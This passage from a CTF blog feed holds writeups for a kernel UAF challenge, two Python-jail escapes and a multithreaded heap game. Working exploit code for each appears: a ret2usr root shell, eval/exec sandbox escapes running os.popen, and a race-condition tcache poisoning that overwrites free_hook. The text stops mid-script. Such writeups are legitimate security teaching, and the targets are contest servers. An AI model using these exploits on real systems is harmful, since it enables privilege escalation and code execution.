(struct)seq_operations</span><br>        <span class="hljs-type">int</span> fd_proc = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br><br>        <span class="hljs-comment">// uaf</span><br>        req.size = <span class="hljs-number">32</span>;<br>        <span class="hljs-type">size_t</span> *buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">32</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) buf[i] = (<span class="hljs-type">size_t</span>) ret2usr_attack;<br>        req.data = buf;<br>        ioctl(fd1, <span class="hljs-number">0xf001</span>, &amp;req);<br><br>        <span class="hljs-comment">// exploit</span><br>        <span class="hljs-type">char</span> bp[<span class="hljs-number">8</span>];<br>        read(fd_proc, bp, <span class="hljs-number">8</span>);<br><br>        <span class="hljs-keyword">if</span> (getuid() == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Success&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Failed&quot;</span>);<br>        &#125;<br><br>        close(fd1);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/05/05/TsukuCTF-2025-writeups-easy-kernel/3.png" alt="image"></p><blockquote><p>Flag: TsukuCTF25{n0w_u_learned_h0w_to_turn_UAF_int0_r00t}</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Linux Kernel Pwn</category>
      
      <category>writeups</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THJCC 2025 Summer / Pyjail01, Pyjail02, MyGame writeups</title>
    <link href="/2025/04/20/THJCC-2025-Pyjail01-Pyjail02-MyGame-writeups/"/>
    <url>/2025/04/20/THJCC-2025-Pyjail01-Pyjail02-MyGame-writeups/</url>
    
    <content type="html"><![CDATA[<p>Challenge source files are available on <a href="https://github.com/pictures2333/THJCC-CTF-2025-Summer">Github</a></p><h1 id="Pyjail01"><a href="#Pyjail01" class="headerlink" title="Pyjail01"></a>Pyjail01</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata, string<br><br>_ = string.ascii_letters<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    inpt = unicodedata.normalize(<span class="hljs-string">&quot;NFKC&quot;</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>))<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> inpt:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> _:<br>            <span class="hljs-keyword">raise</span> NameError(<span class="hljs-string">&quot;No ASCII letters!&quot;</span>)<br>    <br>    <span class="hljs-built_in">exec</span>(inpt)<br><br></code></pre></td></tr></table></figure><p>Variable <code>_</code> is a string with all ascii letters and it is a blacklist.</p><p>The program uses <code>unicodedata.normalize(&quot;NFKC&quot;, input(&quot;&gt; &quot;))</code>, so user can not bypass blacklist by entering Unicode characters.</p><p>The program executes user’s input with <code>exec()</code>, which allows assign values to variables. And the program allows multiple inputs. So you can clear the blacklist with <code>_=&quot;&quot;</code>, then read the flag with <code>print(__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read())</code>.</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;chal.ctf.scint.org&quot;</span>, <span class="hljs-number">19000</span>)<br><br>r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;_=\&#x27;\&#x27;&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;print(__import__(\&quot;os\&quot;).popen(\&quot;cat /flag.txt\&quot;).read())&quot;</span>)<br><br><span class="hljs-built_in">print</span>(r.recvline().decode()[<span class="hljs-number">1</span>:])<br><br>r.close()<br></code></pre></td></tr></table></figure><h1 id="Pyjail02"><a href="#Pyjail02" class="headerlink" title="Pyjail02"></a>Pyjail02</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata<br><br>inpt = unicodedata.normalize(<span class="hljs-string">&quot;NFKC&quot;</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(inpt, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>:&#123;&#125;&#125;, &#123;&#125;))<br></code></pre></td></tr></table></figure><p>The program evaluates user’s input with <code>eval()</code>, but restricts access to bulit-in functions and global&#x2F;local variables.</p><p>But you can access <code>object</code> via MRO chain, then get <code>os._wrap_close</code> from subclasses of <code>object</code>. Finally, you can call <code>popen()</code> and get shell.</p><h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;chal.ctf.scint.org&quot;</span>, <span class="hljs-number">19001</span>)<br><br>_os_warp_idx = <span class="hljs-number">141</span><br>payload = <span class="hljs-string">f&quot;().__class__.__mro__[1].__subclasses__()[<span class="hljs-subst">&#123;_os_warp_idx&#125;</span>].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag.txt&#x27;).read()&quot;</span><br><br>r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, payload.encode())<br><br><span class="hljs-built_in">print</span>(r.recvline().decode()[<span class="hljs-number">1</span>:])<br><br>r.close()<br></code></pre></td></tr></table></figure><h1 id="MyGame"><a href="#MyGame" class="headerlink" title="MyGame"></a>MyGame</h1><p>It is a multi-thread program. You can control two players(player01 and player02) to play the game.</p><h2 id="VIP-Player"><a href="#VIP-Player" class="headerlink" title="VIP Player"></a>VIP Player</h2><p>It gives win function address as gift to all players. But only VIP players can get libc address and put chest on the map.</p><p>You can get VIP by playing lottery (go gambling). In <code>func.h / lottery()</code>, the game generates a random number and convert it to a string <code>rnbuf</code>. Then you can enter your number. It uses <code>!memcmp(rnbuf, gubuf, strlen(gubuf))</code> to compare if <code>rnbuf</code> and player’s input <code>gubuf</code> are the same. If true, then the player can upgrade to VIP.</p><p>But it calls <code>memcmp</code> with the length of user’s input <code>gubuf</code> as <code>n</code>.This means if user inputs <code>\x00</code>, <code>strlen(gubuf)</code> will be 0, and <code>memcmp</code> will not work. The player can bypass the check and upgrade to vip easily.</p><p>We upgrade player01 to VIP in the step.</p><h2 id="Dangling-Pointer"><a href="#Dangling-Pointer" class="headerlink" title="Dangling Pointer"></a>Dangling Pointer</h2><p>With chest, you can put it on map, and put blocks into it.</p><p>Chest structure has a member <code>itemlist</code>, which is a FILO linked list. When a item is put into a chest, the game will create a new <code>inchest</code> structure, save the pointer of the item in <code>inchest.item</code> and push the <code>inchest</code> structure into <code>itemlist</code> of the chest.</p><p><img src="/2025/04/20/THJCC-2025-Pyjail01-Pyjail02-MyGame-writeups/explain_chest.png" alt="chest"></p><p><code>func.h / destory_block()</code>. It will be called when a player chooses <code>[3] Destory block</code> in game menu. When a player destorys a chest, the game will (1) free the chest first, then (2) free all nodes in <code>itemlist</code>. Finally, it will (3) clear the pointer of the chest on map.</p><p>However, while it is performing step 2, there is a dangling poiner of the chest which is freed in step 1. If the chest has a huge number of blocks, it will take a long time (1s or longer) to free all of them. And you can control the other player (player02) to <code>get_block()</code> to get the “freed-chest” before it is cleared in step 3.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">destory_block</span><span class="hljs-params">(<span class="hljs-type">int</span> client_sock, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> usernow)</span> &#123;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-comment">// map selector</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> x, y;<br>    err = map_selector(client_sock, &amp;x, &amp;y);<br>    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span> || x &gt;= MAP_SIZE_X || y &lt; <span class="hljs-number">0</span> || y &gt;= MAP_SIZE_Y) &#123;<br>        send(client_sock, <span class="hljs-string">&quot;Invalid position!\n&quot;</span>, <span class="hljs-number">19</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> *<span class="hljs-title">tmpit</span> =</span> <span class="hljs-built_in">map</span>[y][x].item;<br>    <span class="hljs-keyword">if</span> (!tmpit) &#123; <span class="hljs-comment">// map unit / item on it</span><br>        send(client_sock, <span class="hljs-string">&quot;Nothing in the map unit which you selected.\n&quot;</span>, <span class="hljs-number">45</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// destory!!</span><br>    <span class="hljs-keyword">if</span> (tmpit-&gt;id == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// normal block</span><br>        <span class="hljs-built_in">free</span>(tmpit);<br>        <span class="hljs-built_in">map</span>[y][x].item = <span class="hljs-literal">NULL</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// chest</span><br>        <span class="hljs-keyword">if</span> (tmpit-&gt;owner != usernow) &#123; <span class="hljs-comment">// chest owner protect</span><br>            send(client_sock, <span class="hljs-string">&quot;This box is not yours!\n&quot;</span>, <span class="hljs-number">24</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">// remove items</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inchest</span> *<span class="hljs-title">now</span> =</span> tmpit-&gt;itemlist, *next = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-built_in">free</span>(tmpit);<br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!now) <span class="hljs-keyword">break</span>;<br><br>            next = now-&gt;next;<br><br>            <span class="hljs-built_in">free</span>(now-&gt;item);<br>            <span class="hljs-built_in">free</span>(now);<br>            <br>            now = next;<br>        &#125;<br>        <span class="hljs-comment">// remove chest</span><br>        <span class="hljs-built_in">map</span>[y][x].item = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/20/THJCC-2025-Pyjail01-Pyjail02-MyGame-writeups/explain_get_pointer.jpg" alt="get freed-chest"></p><h2 id="Win-Function"><a href="#Win-Function" class="headerlink" title="Win Function"></a>Win Function</h2><p>With the freed-chest, you can perform Tcache attack.</p><p>Put it on the map, interact with it, and rename it.</p><p>In <code>func.h / item_rename()</code>, user’s input is copied to <code>item-&gt;name</code> as it’s new name.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">item_rename</span><span class="hljs-params">(<span class="hljs-type">int</span> client_sock, <span class="hljs-keyword">struct</span> item *item)</span> &#123;<br>    send(client_sock, <span class="hljs-string">&quot;Name &gt; &quot;</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> namebuf[<span class="hljs-number">8</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> err = recv(client_sock, namebuf, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (err &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-built_in">strncpy</span>(item-&gt;name, namebuf, <span class="hljs-number">8</span>);<br><br>    send(client_sock, <span class="hljs-string">&quot;Done!\n&quot;</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>Because of <code>item-&gt;name</code> and <code>tcache_entry-&gt;next</code> are both placed at the same offset (0x0) and are 8 bytes in size, you can overwrite <code>next</code> of the freed-chest(chunk) with <code>free_hook</code> address by rename it.</p><p><code>struct.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> &#123;</span><br>    <span class="hljs-comment">// common attr</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> name[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> id;<br>    <span class="hljs-comment">// chest attr</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inchest</span> *<span class="hljs-title">itemlist</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> owner;<br>&#125;;<br></code></pre></td></tr></table></figure><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3131">Glibc source code</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-type">uintptr_t</span> key;<br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p><code>func.h / put_block</code>. A VIP player can put blocks on map whether or not there are enough blocks in backpack. The game allocates a new chunk of heap and turn it into a block. </p><p>So you can control player01 to put blocks on map until the game allocates a chunk(block) that is on <code>free_hook</code>, and we can write win function address to <code>free_hook</code> by renaming the block.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">put_block</span><span class="hljs-params">(<span class="hljs-type">int</span> client_sock, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> usernow)</span> &#123;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-comment">// map selector</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> x, y;<br>    err = map_selector(client_sock, &amp;x, &amp;y);<br>    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span> || x &gt;= MAP_SIZE_X || y &lt; <span class="hljs-number">0</span> || y &gt;= MAP_SIZE_Y) &#123;<br>        send(client_sock, <span class="hljs-string">&quot;Invalid position!\n&quot;</span>, <span class="hljs-number">19</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (userlist[usernow]-&gt;perm_vip == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// vip</span><br>        <span class="hljs-comment">// block selector</span><br>        <span class="hljs-type">int</span> block = <span class="hljs-number">0</span>;<br>        err = block_selector(client_sock, &amp;block);<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">if</span> (block != <span class="hljs-number">1</span> &amp;&amp; block != <span class="hljs-number">2</span>) &#123;<br>            send(client_sock, <span class="hljs-string">&quot;Invalid block!\n&quot;</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// put</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>[y][x].item) &#123; <span class="hljs-comment">// map unit / no item on it</span><br>            send(client_sock, <span class="hljs-string">&quot;The map unit which you selected is not clear.\n&quot;</span>, <span class="hljs-number">47</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-built_in">map</span>[y][x].item = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> item));<br>        <span class="hljs-built_in">map</span>[y][x].item-&gt;id = block;<br>        <span class="hljs-built_in">memset</span>(<span class="hljs-built_in">map</span>[y][x].item-&gt;name, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>); <span class="hljs-comment">// &lt;- IMPORTANT</span><br>        <span class="hljs-keyword">if</span> (block == <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-built_in">map</span>[y][x].item-&gt;owner = usernow; <span class="hljs-comment">// chest owner protect</span><br>            <span class="hljs-built_in">map</span>[y][x].item-&gt;itemlist = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    ...<br></code></pre></td></tr></table></figure><p>Now, destory a block, <code>free()</code> is called. Then we can get the flag.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> threading, time<br><br>HOST = <span class="hljs-string">&quot;node2.dynchal.p23.tw&quot;</span><br>PORT = <span class="hljs-number">25850</span><br><br>sig = -<span class="hljs-number">1</span><br>libc = -<span class="hljs-number">1</span><br>win = -<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lottery</span>(<span class="hljs-params">r</span>):<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;6&quot;</span>)<br>    r.sendafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">putblock_vip</span>(<span class="hljs-params">r, mapx, mapy, t</span>):<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(mapx).encode())<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(mapy).encode())<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(t).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">server</span>():<br>    r = process(<span class="hljs-string">&quot;./chal&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">client01</span>():<br>    <span class="hljs-keyword">global</span> sig, libc, win<br><br>    <span class="hljs-comment">#r = remote(&quot;0.0.0.0&quot;, 8080)</span><br>    r = remote(HOST, PORT)<br><br>    info(<span class="hljs-string">&quot;[Thread-1] Register and leak win function address&quot;</span>)<br>    win = <span class="hljs-built_in">int</span>(r.recvline().decode().split(<span class="hljs-string">&quot;&gt;&quot;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>    success(<span class="hljs-string">&quot;[c1] win -&gt; %s&quot;</span>%<span class="hljs-built_in">hex</span>(win))<br><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;c01&quot;</span>);<br><br>    info(<span class="hljs-string">&quot;[Thread-1] Leak libc base&quot;</span>)<br>    lottery(r)<br>    libc = <span class="hljs-built_in">int</span>(r.recvlines(<span class="hljs-number">2</span>)[<span class="hljs-number">1</span>].decode().split(<span class="hljs-string">&quot;&gt;&quot;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">0x61c90</span><br>    success(<span class="hljs-string">&quot;[c1] libc -&gt; %s&quot;</span>%<span class="hljs-built_in">hex</span>(libc))<br><br>    info(<span class="hljs-string">&quot;[Thread-1] Put 10m blocks into chest&quot;</span>)<br>    putblock_vip(r, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>) <span class="hljs-comment"># put a chest</span><br><br>    <span class="hljs-comment"># push 10m blocks into chest</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;10000000&quot;</span>)<br><br>    <span class="hljs-comment"># new block and destory it</span><br>    putblock_vip(r, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br><br>    info(<span class="hljs-string">&quot;[Thread-1] Destory chest&quot;</span>)<br>    <span class="hljs-comment"># destory block</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br><br>    sig = <span class="hljs-number">1</span> <span class="hljs-comment"># client2 to get ref</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> (sig == <span class="hljs-number">2</span>): <span class="hljs-keyword">pass</span><br>    info(<span class="hljs-string">&quot;[Thread-1] Write win function address to free_hook&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        putblock_vip(r, i, <span class="hljs-number">2</span>, <span 